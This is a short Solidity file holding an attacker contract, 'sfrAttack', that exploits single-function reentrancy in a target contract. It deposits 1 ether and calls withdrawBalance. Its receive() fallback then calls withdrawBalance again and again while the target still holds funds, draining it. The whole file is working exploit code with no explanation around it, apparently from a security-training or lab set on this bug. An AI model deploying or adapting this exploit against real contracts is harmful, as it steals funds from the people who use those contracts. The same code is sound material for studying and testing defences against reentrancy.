// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

interface IsingleFunctionReentrancy {
    function deposit() external payable;

    function withdrawBalance() external;
}

contract sfrAttack {
    IsingleFunctionReentrancy impReentrancy;

    constructor(address sfrAddress) payable {
        impReentrancy = IsingleFunctionReentrancy(sfrAddress);
    }

    function deposit() external {
        impReentrancy.deposit{value: 1 ether}();
    }

    function withdrawBalance() external {
        impReentrancy.withdrawBalance();
    }

    function getBalance() external view returns (uint) {
        return address(this).balance;
    }

    receive() external payable {
        if (address(impReentrancy).balance >= 1 ether) {
            impReentrancy.withdrawBalance();
        }
    }
}
